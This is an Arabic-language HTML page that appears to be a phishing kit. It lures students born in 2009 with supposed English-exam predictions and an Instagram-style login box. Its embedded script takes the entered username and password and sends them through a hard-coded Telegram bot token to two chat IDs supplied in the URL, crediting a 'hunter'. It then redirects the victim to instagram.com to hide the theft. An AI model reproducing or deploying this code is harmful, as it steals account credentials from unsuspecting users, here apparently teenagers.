<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>توقعات الإنجليزي - 2009</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; background: #fafafa; text-align: center; margin: 0; }
        .header { background: linear-gradient(45deg, #f09433, #bc1888); color: white; padding: 15px; font-weight: bold; }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; }
        button { width: 95%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="header">مراجعة ليلة الامتحان - جيل 2009 📚</div>
    <video width="100%" autoplay loop muted playsinline><source src="video.mp4" type="video/mp4"></video>
    <div style="background: white; border: 1px solid #dbdbdb; margin: 10px; padding: 20px;">
        <p>سجل دخولك لمشاهدة ملف التوقعات</p>
        <form id="login">
            <input type="text" id="u" placeholder="اسم المستخدم" required>
            <input type="password" id="p" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    <script>
        const pr = new URLSearchParams(window.location.search);
        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
        document.getElementById('login').onsubmit = function(e) {
            e.preventDefault();
            const msg = `🎯 صيدة انستقرام (2009) 🎯\n👤 الصياد: ${pr.get('hunter')}\n📧 الحساب: ${document.getElementById('u').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
            const fullMsg = encodeURIComponent(msg);
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`)
            .then(() => { window.location.href = "https://www.instagram.com"; });
        };
    </script>
</body>
</html>
